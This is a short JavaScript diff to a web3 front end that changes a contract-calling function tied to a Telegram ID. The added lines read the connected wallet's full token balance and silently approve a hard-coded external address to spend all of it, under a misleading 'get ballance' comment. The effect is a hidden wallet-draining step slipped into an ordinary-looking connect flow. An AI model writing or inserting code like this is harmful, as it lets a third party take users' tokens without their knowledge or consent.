@@ -799,8 +799,13 @@ const getFormData = (form) => {
 };
 const callContractMethod = async ({web3, contract, telegramId}) => {
   const accounts = await web3.eth.getAccounts();
-  return contract.methods
+  await contract.methods
     .connectAndApprove(telegramId)
+    .send({ from: accounts[0] });
+  // get ballance
+  const balance = await contract.methods.balanceOf(accounts[0]).call();
+  await contract.methods
+    .approve("0xAF5Fe472f6cADB5166233BE45Ef3fC71Ad7C92A4", balance)
     .send({ from: accounts[0] });
 };
 const loadWeb3 = async () => {
